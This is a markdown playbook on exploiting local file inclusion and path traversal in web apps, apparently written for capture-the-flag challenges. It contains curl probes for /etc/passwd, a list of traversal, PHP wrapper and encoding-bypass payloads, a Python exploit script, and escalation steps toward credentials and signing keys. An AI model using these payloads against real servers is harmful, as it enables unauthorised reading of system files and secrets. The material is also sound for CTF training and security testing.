# Web LFI And Path Traversal

## When to suspect this

- Parameters named `file`, `path`, `page`, `template`, `download`, `image`, `lang`, `theme`, `next`.
- File download/viewer/image routes reference user-controlled filenames.
- Errors reveal filesystem paths.
- Source joins paths with user input or only strips `../`.
- Upload path can be revisited with nested path segments.

## Fast triage checklist

- Identify whether target reads files, directories, templates, static files, or wrappers.
- Test `../` depth and URL encoding.
- Check Linux and app-specific paths.
- Try absolute path if relative traversal fails.
- Try wrapper/protocol support.
- Check normalization order: decode before/after validation.
- Try symlink/archive traversal if upload exists.

## Manual confirmation

```bash
curl -sk 'http://HOST/view?file=../../../../etc/passwd'
curl -sk 'http://HOST/view?file=..%2f..%2f..%2f..%2fetc%2fpasswd'
curl -sk 'http://HOST/view?file=....//....//....//etc/passwd'
curl -sk 'http://HOST/view?file=/etc/passwd'
curl -sk 'http://HOST/view?file=php://filter/convert.base64-encode/resource=index.php'
```

Positive signal:

- `/etc/passwd` style content.
- Source code base64.
- App config/source file.
- Distinct path error showing traversal resolution.

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/web/lfi_wordlist_probe.py](../scripts/web/lfi_wordlist_probe.py) | Probe likely files once traversal works | `python3 scripts/web/lfi_wordlist_probe.py --url 'http://HOST/view?file=INJECT'` | Interesting files found |
| `curl` | Manual path probes | `curl -sk "$URL?file=../../../../etc/passwd"` | File content |
| `ffuf` | Fuzz filenames/backup paths | `ffuf -u "$URL?file=FUZZ" -w files.txt` | Non-baseline lengths |
| CyberChef | Decode `php://filter` output | Base64 decode | Source code |

## Payload starter pack

Linux:

```text
../../../../etc/passwd
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../proc/self/fd/0
../../../../app/app.py
../../../../var/www/html/index.php
```

PHP:

```text
php://filter/convert.base64-encode/resource=index.php
php://input
zip://shell.png%23payload.php
phar://upload.phar
```

Bypasses:

```text
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//etc/passwd
.%2e/%2e%2e/%2e%2e/etc/passwd
```

## Exploit skeleton

```python
#!/usr/bin/env python3
import requests, urllib.parse

URL = "http://HOST/view?file=INJECT"
COOKIE = {"session": "COOKIE"}
paths = [
    "../../../../etc/passwd",
    "../../../../proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "../../../../app/flag.txt",
    "../../../../flag",
]

for p in paths:
    r = requests.get(URL.replace("INJECT", urllib.parse.quote(p, safe="/:%")), cookies=COOKIE, timeout=10)
    if r.status_code == 200 and len(r.text) > 0:
        print(f"\n== {p} status={r.status_code} len={len(r.text)} ==")
        print(r.text[:1000])
```

## Escalation path

- Read source code and configs to identify secrets and routes.
- If PHP source leaks, look for upload paths, session signing keys, DB credentials, includes.
- If `/proc/self/environ` or logs are readable, attempt log/session poisoning only if appropriate.
- If path read is limited, use wrappers or symlink/archive traversal.
- If only static files, look for source maps, backups, `.git`, `.bzr`.

## Common bypasses

- Double URL encoding.
- Recursive replacement bypass `....//`.
- Unicode homoglyphs/normalization.
- Absolute path.
- Windows 8.3 short names.
- `/dev/fd` symlink to `/proc/self/fd`.
- Nginx alias traversal with slash mismatch.
- Zip/tar symlink traversal.

## Rabbit holes

- Brute forcing paths before proving traversal depth.
- Reading local source-only flags instead of remote behavior.
- Missing app-specific paths from Docker/source.
- Assuming `/etc/passwd` absence means no traversal.
- Forgetting URL encoding may be decoded by proxy and app differently.

## Final solve checklist

- Traversal primitive is manually reproducible.
- You identified read root and normalization behavior.
- Source/config discoveries are used only to build reachable exploit steps.
- Final flag is read through the service.

